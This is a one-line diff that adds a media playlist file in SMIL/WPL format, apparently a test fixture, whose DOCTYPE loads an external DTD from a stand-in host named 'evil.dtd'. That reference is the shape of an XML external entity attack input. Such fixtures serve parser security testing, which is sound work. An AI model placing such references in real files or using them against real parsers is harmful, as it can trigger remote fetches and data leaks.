@@ -1,0 +1,1 @@
+<!DOCTYPE smil SYSTEM "https://entity.example.invalid/evil.dtd"><?wpl version="1.0"?><smil><head></head><body><seq><media src="../media/a.wav"/></seq></body></smil>
